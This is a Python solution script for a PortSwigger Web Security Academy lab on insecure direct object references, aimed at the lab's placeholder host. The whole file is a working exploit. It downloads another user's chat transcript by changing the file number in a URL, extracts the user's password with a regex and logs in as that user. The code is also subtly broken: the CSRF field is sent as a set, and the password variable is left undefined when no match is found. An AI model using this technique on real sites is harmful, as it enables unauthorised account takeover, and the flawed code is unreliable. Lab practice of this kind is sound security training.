# Lab: Insecure direct object references
# https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

import requests
import re

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Extract CSRF token for carlos login later
login_response = session.get(f"{base_url}/login")
csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_response.text)
if not csrf_match:
    print("[-] CSRF token not found")
    exit()
csrf_token = csrf_match.group(1)

# visit the /chat page and view transcript
# change value from 2.txt to 1.txt
response = session.get(f"{base_url}/download-transcript/1.txt")

# extract the password for carlos
match = re.search(r"my password is (\w+)", response.text)
if match:
    password = match.group(1)
    print(f"[+] Extracted password: {password}")
else:
    print("[-] Password not found")

# login as carlos
login_data = {"username": "carlos", "password": password, "csrf": {csrf_token}}
response = session.post(f"{base_url}/login", data=login_data)
print(response.text)

